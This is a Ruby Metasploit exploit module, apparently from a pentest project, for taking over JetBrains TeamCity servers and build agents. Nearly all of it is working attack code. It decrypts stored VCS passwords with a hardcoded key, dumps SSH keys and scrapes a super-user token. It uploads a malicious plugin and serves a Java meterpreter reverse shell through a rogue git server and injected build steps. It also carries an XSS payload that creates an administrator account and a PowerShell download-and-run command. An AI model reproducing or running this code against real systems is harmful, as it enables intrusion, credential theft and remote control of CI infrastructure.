##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'open3'
require 'json'
require 'base64'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HttpServer
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      'Name' => 'JetBrains TeamCity',
                      'Description' => 'Obtain meterpreter on TeamCity server and build agents',
                      'License' => 'MIT',
                      'Author' => ['Kacper Szurek'],
                      'References' =>
                          [
                              ['URL', 'https://github.com/kacperszurek/pentest_teamcity'],
                          ],
                      'Targets' =>
                          [
                              ['Automatic', {}]
                          ],
                      'Arch' => ARCH_JAVA,
                      'Platform' => '',
                      'DefaultTarget' => 0
                      ))

    register_options(
        [
            OptString.new('TARGETURI', [true, 'The path to TeamCity root', '/']),
            OptString.new('USERNAME', [true, 'The username', 'login']),
            OptString.new('PASSWORD', [true, 'The password', 'password']),
            OptString.new('URIPATH', [false, 'The URI to use for web server', '/']),
            OptString.new('SERVER_PLUGIN', [true, 'The path to server plugin zip', File.expand_path(File.dirname(__FILE__)) + '/serverplugin.zip']),
            OptString.new('GIT_PATH', [true, 'Path to directory where git is installed', '/usr/bin']),
            OptString.new('PROJECT_ID', [true, 'Specify project id', 'random']),
            OptString.new('BUILD_TYPE_ID', [true, 'Specify build type id', 'random']),
            OptString.new('VCS_ID', [true, 'Specify VCS id', 'random']),
            OptString.new('CLEANUP', [true, 'Delete created projects/builds', 'false']),
        ])
    @git_dir = nil
    @already_cleaned = true
    @metasploit_payload_path = rand_text_alpha(rand(6)+3) + ".jar"
    @roles = {}

  end

  # We allow only JAR meterpreter here
  def is_payload_compatible?(name)
    (name == 'java/meterpreter/reverse_tcp') ? true : false
  end

  # Check if this is TeamCity server
  def check
    res = send_request_cgi({
                               'method' => 'GET',
                               'uri' => normalize_uri(target_uri.path, '/login.html'),
                           })

    if res and res.code == 200 and res.body.to_s.include? 'teamcity.ui.websocket'
      Exploit::CheckCode::Vulnerable
    else
      Exploit::CheckCode::Safe
    end
  end

  # Wrapper for send_request_cgi which allows sending JSON
  def send_authenticated_request_and_parse(url, method = 'GET', data = nil, timeout: 5, vars_get: {})

    params = {
        'method' => method,
        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
        'uri' => normalize_uri(target_uri.path, url),
        'ctype' => 'application/json',
        'headers' => { "Accept" => "application/json" }
    }

    unless data.nil?
      params['data'] = data
    end

    unless vars_get.empty?
      params['vars_get'] = vars_get
    end

    res = send_request_cgi(params, timeout)
    output = nil

    begin
      if res
        if res.code == 200
          output = JSON.parse(res.body.to_s)
        elsif res.code == 204

          output = {'status' => true}
        end
      end
    rescue
      nil
    end
    output
  end

  def check_guest_access
    res = send_request_cgi({
                               'method' => 'GET',
                               'uri' => normalize_uri(target_uri.path, "/login.html"),
                           })

    if res and res.code == 200 and res.body.to_s.include? "guestLogin.html?guest=1"
      print_status "Server allows guest access"
    end
  end

  def check_super_user_token
    res = send_request_cgi({
                               'method' => 'GET',
                               'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
                               'uri' => normalize_uri(target_uri.path, '/get/file/serverLogs/teamcity-server.log?forceInline=true'),
                           })

    if res and res.code == 200
      token = res.body.to_s.scan(/Super user authentication token: "([0-9]+)"/).last
      if token
        token = token[0].to_s
        print_status "Super User token: #{token}"
      end
    end
  end

  # Get VCS root passwords, password parameters and password fields
  def check_credentials_from_export
    des = OpenSSL::Cipher.new('des-ede3')
    des.decrypt
    des.key =  [61, 22, 11, 57, 110, 89, -20, -1, 0, 99, 111, -120, 55, 4, -9, 10, 11, 45, 71, -89, 21, -99, 54, 51].map { |x| x.to_i }.pack('c*')

    # All projects for which we have privileges
    projects = send_authenticated_request_and_parse('/httpAuth/app/rest/projects')
    if !projects.nil? and projects.key?("project")
      projects['project'].each do |project|
        if project['id'] == '_Root'
          next
        end

        print_status "Trying export project: #{project['id']}"
        res = send_request_cgi({
                                   'method' => 'GET',
                                   'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
                                   'uri' => normalize_uri(target_uri.path, "/admin/editProject.html?projectId=#{project['id']}&tab=projectExport"),
                               })

        if res and res.code == 200
          token = res.body.to_s.scan(/id="startExportBtn" href="([^"]+)"/).last
          if token
            res = send_request_cgi({
                                       'method' => 'GET',
                                       'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
                                       'uri' => normalize_uri(target_uri.path, token[0].to_s  ),
                                   })
            if res and res.code == 200
              Zip::File.open_buffer(res.body) do |zip|
                zip.each do |entry|
                  zip_file_path = entry.to_s

                  if zip_file_path.end_with? ".xml"
                    begin
                      doc = Nokogiri::XML(entry.get_input_stream.read)

                      doc.xpath('//param').each do |param|
                        encrypted_password = param['value'].to_s
                        if encrypted_password.start_with? "zxx"
                          encrypted = [encrypted_password[3..encrypted_password.length]].pack('H*')
                          des.reset
                          final = des.update(encrypted) + des.final
                          print_status param['name'].to_s
                          print_status final
                        end
                      end
                    rescue
                      nil
                    end
                  elsif zip_file_path.include? "ssh_keys"
                    print_status "SSH key #{File.basename(zip_file_path)}:\n#{entry.get_input_stream.read}"
                  end
                end
              end
            else
              print_status "Export failed"
            end
          end
        end
      end
    end
  end

  # Path to our webserver
  def resource_path(additional_path = '')
    proto = (datastore["SSL"] ? "https" : "http")

    if datastore['SRVHOST'] == '0.0.0.0'
      output = "#{proto}://#{Rex::Socket.source_address('1.2.3.4')}:#{datastore['SRVPORT']}#{get_resource}#{additional_path}"
    else
      output = "#{proto}://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}#{get_resource}#{additional_path}"
    end
    output
  end

  def send_meterpreter_to_server
    res = send_request_cgi({
                               'method' => 'GET',
                               'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
                               'uri' => normalize_uri(target_uri.path, '/demoPlugin.html'),
                               'vars_get' => {
                                   'file_url' => resource_path('payload'),
                                   'file_path' => rand_text_alpha(rand(6)+3)+".jar",
                               },
                           })
    if res and res.code == 200 and res.body.to_s.include? 'OK'
      print_status 'Waiting for SRV Metasploit connection'
      return true
    end
    false
  end

  # Waiting for server restart
  def wait_for_restart
    loop do
      begin
        res = send_request_cgi({
                                   'method' => 'GET',
                                   'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
                                   'uri' => normalize_uri(target_uri.path, '/demoPlugin.html'),
                               }, 5)

        if res and res.code == 200 and res.body.to_s.include? 'OKK'
          print "\n"
          print_status "Server restarted"
          sleep 15
          send_meterpreter_to_server
          return
        end
        print "."
        sleep 5
      rescue
        print "!"
      end
    end
  end

  def install_server_plugin
    # Already PWNed
    if send_meterpreter_to_server
      return
    end

    unless File.file?(datastore['SERVER_PLUGIN'])
      print_error "Cannot find server plugin: #{datastore['SERVER_PLUGIN']}. Please modify SERVER_PLUGIN"
      return
    end

    server_plugin_filename = rand_text_alpha(rand(6)+3)+".zip"
    server_plugin_content = ''
    File.open(datastore['SERVER_PLUGIN'], 'rb') do |f|
      server_plugin_content = f.read
    end

    res = send_request_cgi({
                               'method' => 'GET',
                               'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
                               'uri' => normalize_uri(target_uri.path, '/admin/admin.html?item=diagnostics&tab=dataDir'),
                           })

    if res and res.code == 200

      csrf_token = /name="tc-csrf-token" content="([a-z0-9\-]+)"/.match(res.body.to_s)
      teamcity_path = /name="destination" value="([^"]+)"/.match(res.body.to_s)

      if csrf_token and teamcity_path
        print_status "CSRF token: #{csrf_token[1]}"
        print_status "TeamCity path: #{teamcity_path[1]}"

        post_data = Rex::MIME::Message.new
        post_data.add_part(server_plugin_content, 'application/x-zip-compressed', 'binary', "form-data; name=\"file:fileToUpload\"; filename=\"#{server_plugin_filename}")
        post_data.add_part(csrf_token[1], nil, nil, "form-data; name=\"tc-csrf-token\"")
        post_data.add_part("#{teamcity_path[1].chomp('/')}/plugins", nil, nil, "form-data; name=\"destination\"")
        post_data.add_part(server_plugin_filename, nil, nil, "form-data; name=\"fileName\"")

        res = send_request_cgi({
                                   'method' => 'POST',
                                   'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
                                   'uri' => normalize_uri(target_uri.path, '/admin/dataDir.html'),
                                   'ctype' => "multipart/form-data; boundary=#{post_data.bound}",
                                   'data' => post_data.to_s,
                               })

        if res.body.to_s.include? "closeAndRefresh"
          res = send_request_cgi({
                                     'method' => 'POST',
                                     'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
                                     'uri' => normalize_uri(target_uri.path, '/admin/serverRestart.html'),
                                     'vars_post' => {
                                         'start' => '1',
                                     },
                                 })

          if res.body.to_s.include? 'success="true"'
            print_status "Plugin uploaded, waiting for restart"
            wait_for_restart
          else
            print_error "Cannot restart TeamCity Server"
          end
        else
          print_error "Plugin upload failed"
        end
      else
        print_error "Cannot get CSRF token or TeamCity path"
      end
    end
  end

  def run_command_in_dir(current_dir, search_string, command, *parameters)
    result = ""
    Dir.chdir(current_dir) do
      Open3.popen3(command, *parameters) do |i, o, e, w|
        begin
          Timeout.timeout(5) do
            result = o.read
          end
        rescue Timeout::Error
          Process.kill("KILL", w.pid)
        end
      end
    end
    (result.start_with? search_string) ? true : false
  end

  def setup_git_repo
    git_upload_pack_path = "#{datastore['GIT_PATH']}/git-upload-pack"
    git_path = "#{datastore['GIT_PATH']}/git"


    unless File.file?(git_upload_pack_path) or File.file?(git_path)
      fail_with(Failure::Unknown, "Cannot find git inside #{datastore['GIT_PATH']}. Please change GIT_PATH")
    end

    xss = %{
  <script>
  username = "my_new_username";
  email = "user@email.email"
  password = "my_new_password"

  var BS = {};
  </script>
  <script type="text/javascript" src="/js/crypt/jsbn.js"></script>
  <script type="text/javascript" src="/js/crypt/prng4.js"></script>
  <script type="text/javascript" src="/js/crypt/rng.js"></script>
  <script type="text/javascript" src="/js/crypt/rsa.js"></script>

  <script>
  function encryptData(data, publicKey) {
    BS.Crypto.rng_seed_time();
    var rsa = new BS.Crypto.RSAKey();
    rsa.setPublic(publicKey, "10001");
    return rsa.encrypt(data);
  }

  function get_regexp(regexp, data) {
    var match = regexp.exec(data);
    return match[1];
  }

  var createUser = new XMLHttpRequest();
  createUser.open("GET", "/admin/createUser.html", false);
  createUser.send();
  var csrftoken = get_regexp(/tc-csrf-token" value="([^"]*?)"/g, createUser.responseText);
  var publickey = get_regexp(/name="publicKey" value="([^"]*?)"/g, createUser.responseText);
  var encrypted_password = encryptData(password, publickey);

  var params = "_administrator=true&administrator=true&username1="+escape(username)+"&name="+escape(username)+"&email="+escape(email)+"&publicKey="+escape(publickey)+"&_createMoreUsers=&submitCreateUser=Create+User&tc-csrf-token="+escape(csrftoken)+"&encryptedPassword1="+escape(encrypted_password)+"&encryptedRetypedPassword="+escape(encrypted_password);
  var createUserPost = new XMLHttpRequest();
  createUserPost.open("POST", "/admin/createUserSubmit.html", false);
  createUserPost.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  createUserPost.send(params);

  var listUsers = new XMLHttpRequest();
  listUsers.open("GET", "/admin/admin.html?item=users", false);
  listUsers.send();
  var userid = get_regexp(new RegExp('admin\\/editUser.html.*?userId=([0-9]+)[^"]*">'+username+'<', "g"), listUsers.responseText);

  var params = "-ufd-teamcity-ui-role=System+administrator&role=SYSTEM_ADMIN&roleScope=global&_replaceRoles=&assignRoles=Assign&tc-csrf-token="+escape(csrftoken)+"&rolesHolderId="+escape(userid)
  var addRole = new XMLHttpRequest();
  addRole.open("POST", "/admin/action.html", false);
  addRole.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  addRole.send(params);
  </script>
    }

    setup_ok = false
    @git_dir = Dir.mktmpdir
    exploit_filepath = "#{@git_dir}/#{@metasploit_payload_path}"
    xss_git_filepath = "#{@git_dir}/" + rand_text_alpha(rand(6)+3).downcase + ".html"
    File.open(exploit_filepath, 'wb') {|file| file.write(payload.encoded)}
    File.open(xss_git_filepath, 'w') {|file| file.write(xss)}
    if run_command_in_dir @git_dir, "Initialized empty", git_path, "init", "."
      if run_command_in_dir @git_dir, "add '", git_path, "add", "-v", exploit_filepath
        if run_command_in_dir @git_dir, "add '", git_path, "add", "-v", xss_git_filepath
          if run_command_in_dir @git_dir, "[master", git_path, "commit", "--author", "test <test@test.test>", "-m", "new"
            setup_ok = true
          end
        end
      end
    end

    unless setup_ok
      fail_with(Failure::Unknown, "Cannot setup GIT")
    end
  end

  def check_roles(role_name, role_value = nil)
    if @roles.key? role_name
      if role_value.nil?
        return true
      else
        return @roles[role_name].include? role_value
      end
    end
    false
  end

  def setup_roles
    res = send_authenticated_request_and_parse('/httpAuth/app/rest/latest/users/current/roles')

    if res.nil?
      fail_with(Failure::Unknown, "Cannot login as #{datastore['USERNAME']}:#{datastore['PASSWORD']}")
    end

    if !res.nil? and res.key?("role")
      res['role'].each do |role|
        if role['roleId'] == 'SYSTEM_ADMIN'
          @roles['SYSTEM_ADMIN'] = get_projects
          print_status "SYSTEM_ADMIN privileges, full access"
        elsif role['roleId'] == 'PROJECT_ADMIN'
          unless @roles.key? 'PROJECT_ADMIN'
            @roles['PROJECT_ADMIN'] = []
          end

          project = role['scope'][2..-1]

          if project == '_Root'
            @roles['PROJECT_ADMIN'] += ["_Root"]
            @roles['PROJECT_ADMIN'] += get_projects
            print_status "PROJECT_ADMIN privileges for ALL projects"
          else
            @roles['PROJECT_ADMIN'] << project.downcase
            print_status "PROJECT_ADMIN privileges for #{project}"
          end
        elsif role['roleId'] == 'PROJECT_DEVELOPER'
          unless @roles.key? 'PROJECT_DEVELOPER'
            @roles['PROJECT_DEVELOPER'] = []
          end

          project = role['scope'][2..-1]
          if project == '_Root'
            @roles['PROJECT_DEVELOPER'] += ["_Root"]
            @roles['PROJECT_DEVELOPER'] += get_projects
            print_status "PROJECT_DEVELOPER privileges for ALL projects"
          else
            @roles['PROJECT_DEVELOPER'] << project.downcase
            print_status "PROJECT_DEVELOPER privileges for #{project}"
          end
        end
      end
    end
  end

  # our hack because we need to setup own content-type
  def create_response(code = 200, message = "OK", proto = Rex::Proto::Http::DefaultProtocol)
    res = Rex::Proto::Http::Response.new(code, message, proto)
  end

  def send_response(cli, body, headers = {})
    response = create_response
    response.body = body.to_s.unpack("C*").pack("C*")

    headers.each_pair {|k, v| response[k] = v}

    cli.send_response(response)
  end

  # Our very simple GIT server
  # @see http://stewartjpark.com/2015/01/02/implementing-a-git-http-server-in-python.html
  def on_request_uri(cli, request)
    client = cli.peerhost

    git_path = "#{datastore['GIT_PATH']}/git-upload-pack"

    print_status("Client #{client} requested #{request.raw_uri}")

    if request.raw_uri.include? "info/refs"
      Open3.popen3(git_path, '--stateless-rpc', '--advertise-refs', @git_dir) do |i, o, e, w|
        begin
          Timeout.timeout(5) do
            result = o.read
            send_response(cli, "001e# service=git-upload-pack\n0000" + result, {'Content-Type': 'application/x-git-upload-pack-advertisement'})
          end
        rescue Timeout::Error
          Process.kill("KILL", w.pid)
        rescue
          nil
        end
      end
    elsif request.raw_uri.include? "git-upload-pack"
      # Sometimes JGit sends data in compressed way
      begin
        gz = Zlib::GzipReader.new(StringIO.new(request.body))
        uncompressed_string = gz.read
      rescue
        uncompressed_string = request.body
      end
      Open3.popen3(git_path, '--stateless-rpc', @git_dir) do |i, o, e, w|
        begin
          Timeout.timeout(5) do
            i.write uncompressed_string
            i.close_write
            result = o.read
            send_response(cli, result, {'Content-Type': 'application/x-git-upload-pack-result'})
          end
        rescue Timeout::Error
          Process.kill("KILL", w.pid)
        rescue
          nil
        end
      end
    elsif request.raw_uri.include? "payload"
      begin
        send_response(cli, payload.encoded)
      end
    end
  end

  # List projects for each current user has access to
  def get_projects
    projects = []
    res = send_authenticated_request_and_parse('/httpAuth/app/rest/projects')
    if !res.nil? and res.key?("project")
      res['project'].each do |project|
        if project['id'] == '_Root'
          next
        end
        projects << project['id'].downcase
      end
    end
    projects
  end

  def create_project(project_id)
    return_value = nil
    res = send_authenticated_request_and_parse("/httpAuth/app/rest/projects/#{project_id}")
    if !res.nil? and res.key?("id")
      return_value = res['id']
      print_status "Project #{return_value} already exist"
    else
      res = send_authenticated_request_and_parse('/httpAuth/app/rest/projects', 'POST', {"name" => project_id}.to_json)
      if !res.nil? and res.key?("id")
        return_value = res['id']
        print_status "Project #{return_value} created"
      else
        print_warning "Cannot create project"
      end
    end
    return_value
  end

  def create_build_type(project_id, build_type_id)
    return_value = nil
    res = send_authenticated_request_and_parse("/httpAuth/app/rest/projects/#{project_id}/buildTypes/#{build_type_id}")
    if !res.nil? and res.key?("id")
      return_value = res['id']
      print_status "Build type #{return_value} already exist"
    else
      payload = {"name" => build_type_id, "projectId" => project_id}
      res = send_authenticated_request_and_parse("/httpAuth/app/rest/projects/#{project_id}/buildTypes/", 'POST', payload.to_json)

      if !res.nil? and res.key?("id")
        return_value = res['id']
        print_status "Build type #{return_value} created"
      else
        print_warning "Cannot create build type"
      end
    end
    return_value
  end

  def create_build_step(build_type_id)
    return_value = nil
    res = send_authenticated_request_and_parse("/httpAuth/app/rest/buildTypes/id:#{build_type_id}/steps/")
    if !res.nil? and res.key?('step')
      res['step'].each do |step|
        if step.key?('properties') and step['properties'].key?('property')
          step['properties']['property'].each do |property|
            if property['name'] == 'command.parameters' and property['value'].end_with? @metasploit_payload_path
              return_value = step['id']
              print_status "Build step #{return_value} already exist"
              @build_step_id = return_value
              return return_value
            end
          end
        end
      end
    end

    if return_value.nil?
      payload = {"type" => "simpleRunner", "properties" => {"count" => 3, "property" => [{"name" => "command.executable", "value" => "%teamcity.agent.jvm.java.home%/bin/java"}, {"name" => "command.parameters", "value" => "-jar %system.teamcity.build.checkoutDir%/#{@metasploit_payload_path}"}, {"name" => "teamcity.step.mode", "value" => "execute_always"}]}}
      res = send_authenticated_request_and_parse("/httpAuth/app/rest/buildTypes/id:#{build_type_id}/steps/", 'POST', payload.to_json)

      if !res.nil? and res.key?("id")
        return_value = res['id']
        print_status "Build step #{return_value} created"
      else
        print_warning "Cannot create build step"
      end
    end
    @build_step_id = return_value
    return_value
  end

  def create_vcs_root(project_id, vcs_id)
    return_value = nil
    res = send_authenticated_request_and_parse("/httpAuth/app/rest/vcs-roots/#{project_id}_#{vcs_id}")
    if !res.nil? and res.key?("id")
      return_value = res['id']
      print_status "VCS root #{return_value} already exist"
    else
      payload = {"name" => vcs_id, "vcsName" => "jetbrains.git", "project" => {"id" => project_id}, "properties" => {"count" => 3, "property" =>[{"name" => "authMethod", "value" => "ANONYMOUS"}, {"name" => "branch", "value" => "refs/heads/master"}, {"name" => "url", "value" => resource_path}]}}
      res = send_authenticated_request_and_parse("/httpAuth/app/rest/vcs-roots", 'POST', payload.to_json)
      if !res.nil? and res.key?("id")
        return_value = res["id"]
        print_status "VCS root #{return_value} created"
      else
        print_warning "Cannot create vcs root"
      end
    end
    return_value
  end

  def add_vcs_to_build_type(build_type_id, vcs_id)
    return_value = nil
    res = send_authenticated_request_and_parse("/httpAuth/app/rest/buildTypes/id:#{build_type_id}/vcs-root-entries/#{vcs_id}")
    if !res.nil? and res.key?("id")
      return_value = res["id"]
      print_status "VCS root #{vcs_id} already added to #{build_type_id}"
    else
      payload = {"vcs-root" => {"id" => vcs_id}}
      res = send_authenticated_request_and_parse("/httpAuth/app/rest/buildTypes/id:#{build_type_id}/vcs-root-entries", 'POST', payload.to_json)
      if !res.nil? and res.key?("id")
        return_value = res["id"]
        print_status "VCS root #{vcs_id} added to #{build_type_id}"
      else
        print_warning "Cannot add vsc root to build type"
      end
    end
  end

  def add_exploit_inside_project(project_id, build_type_id, vcs_id)
    project_id = create_project(project_id)
    return if project_id.nil?
    build_type_id = create_build_type(project_id, build_type_id)
    return if build_type_id.nil?
    build_step_id = create_build_step(build_type_id)
    return if build_step_id.nil?
    vcs_id = create_vcs_root(project_id, vcs_id)
    return if vcs_id.nil?
    vcs_id_added = add_vcs_to_build_type(build_type_id, vcs_id)
    return if vcs_id_added.nil?
    send_authenticated_request_and_parse('/httpAuth/action.html', 'POST', vars_get: {"add2Queue" => build_type_id, "agentId" => "allEnabledCompatible", "moveToTop" => "true", "personal" => "true"})
    @already_cleaned = false
    print_status "Build started, waiting for session"
  end

  def powershell_exploit
    payload = <<-EOF
"C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe" -command "(new-object System.Net.WebClient).DownloadFile([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('#{Base64.strict_encode64(resource_path('payload'))}')), '%system.teamcity.build.tempDir%/#{@metasploit_payload_path}');Start-Process -FilePath '%teamcity.agent.jvm.java.home%/bin/java.exe' -ArgumentList '-jar', '%system.teamcity.build.tempDir%/#{@metasploit_payload_path}';"
    EOF

    projects = send_authenticated_request_and_parse('/httpAuth/app/rest/projects')
    if !projects.nil? and projects.key?("project")
      projects['project'].each do |project|
        res = send_authenticated_request_and_parse("/httpAuth/app/rest/projects/#{project['id']}/buildTypes")
        if !res.nil? and res.key?("buildType")
          res['buildType'].each do |build_type|
            is_git = false
            # Check build type vcs
            res2 = send_authenticated_request_and_parse("/httpAuth/app/rest/buildTypes/id:#{build_type['id']}/vcs-root-entries", 'GET')

             if !res2.nil? and res2.key?('vcs-root-entry')
               res2['vcs-root-entry'].each do |vcs|
                 if vcs.key?('vcs-root')
                   res3 = send_authenticated_request_and_parse("/httpAuth/app/rest/vcs-roots/id:#{vcs['vcs-root']['id']}", 'GET')
                   if !res3.nil? and res3.key?('vcsName') and res3['vcsName'] == 'jetbrains.git'
                     is_git = true
                   end
                 end
               end
             end
            if is_git
              print_status "Start powershell build #{build_type['id']}"
              send_authenticated_request_and_parse('/httpAuth/action.html', 'POST', vars_get: {"add2Queue" => build_type['id'], "agentId" => "allEnabledCompatible", "moveToTop" => "true", "personal" => "true", "name" => "env.TEAMCITY_GIT_PATH", "value" => payload})
              return
            end
          end
        end
      end
      print_warning "There is no builds we can use"
    else
      print_warning "You dont have access to any project"
    end
  end

  def primer
    if datastore['LHOST'] == '0.0.0.0'
      fail_with(Failure::Unknown, "Please bind LHOST to specific IP address, no to 0.0.0.0")
    end
    setup_git_repo
    setup_roles

    check_guest_access
    check_credentials_from_export
    if check_roles('SYSTEM_ADMIN')
      check_super_user_token
      install_server_plugin
    end

    @build_step_id = nil
    @project_id = datastore['PROJECT_ID'].downcase
    if @project_id == 'random'
      @project_id = rand_text_alpha(rand(6)+3).downcase
    end

    @build_type_id = datastore['BUILD_TYPE_ID'].downcase
    if @build_type_id == 'random'
      @build_type_id = rand_text_alpha(rand(6)+3).downcase
    end

    @vcs_id = datastore['VCS_ID'].downcase
    if @vcs_id == 'random'
      @vcs_id = rand_text_alpha(rand(6)+3).downcase
    end

    if check_roles('SYSTEM_ADMIN')
      add_exploit_inside_project(@project_id, @build_type_id, @vcs_id)
    elsif check_roles('PROJECT_ADMIN')
      projects = @roles['PROJECT_ADMIN']
      if check_roles('PROJECT_ADMIN', '_Root') or projects.include? @project_id
          add_exploit_inside_project(@project_id, @build_type_id, @vcs_id)
      else
        print_status "You can modify only following projects: #{projects.to_s}"
        fail_with(Failure::Unknown, "Cannot modify #{@project_id}")
      end
    else
      print_status "Trying powershell method"
      powershell_exploit
    end
  end

  def cleanup
    super
    if datastore['CLEANUP'].downcase == 'true'
      if @already_cleaned
        return
      end
      @already_cleaned = true

      print_status("Start cleanup")

      unless @git_dir.nil?
        print_status("Remove git temp dir #{@git_dir}")
        FileUtils.remove_entry @git_dir
      end

      unless @build_step_id.nil?
        print_status "Delete step #{@build_step_id}"
        send_authenticated_request_and_parse("/httpAuth/app/rest/buildTypes/id:#{@project_id}_#{@build_type_id}/steps/#{@build_step_id}", 'DELETE', nil, timeout:3)
      end

      if datastore['VCS_ID'] == 'random'
        print_status "Delete VCS #{@vcs_id}"
        send_authenticated_request_and_parse("/httpAuth/app/rest/buildTypes/id:#{@project_id}_#{@build_type_id}/vcs-root-entries/#{@project_id}_#{@vcs_id}", 'DELETE', nil, timeout:3)
        send_authenticated_request_and_parse("/httpAuth/app/rest/vcs-roots/id:#{@project_id}_#{@vcs_id}", 'DELETE', nil, timeout:3)
      end

      if datastore['BUILD_TYPE_ID'] == 'random'
        print_status "Delete build type #{@build_type_id}"
        send_authenticated_request_and_parse("/app/rest/buildTypes/id:#{@project_id}_#{@build_type_id}", 'DELETE', timeout:2)
      end

      if datastore['PROJECT_ID'] == 'random'
        print_status "Delete project #{@project_id}"
        send_authenticated_request_and_parse("/httpAuth/app/rest/projects/#{@project_id}", 'DELETE', nil, timeout:3)
      end
    end
  end
end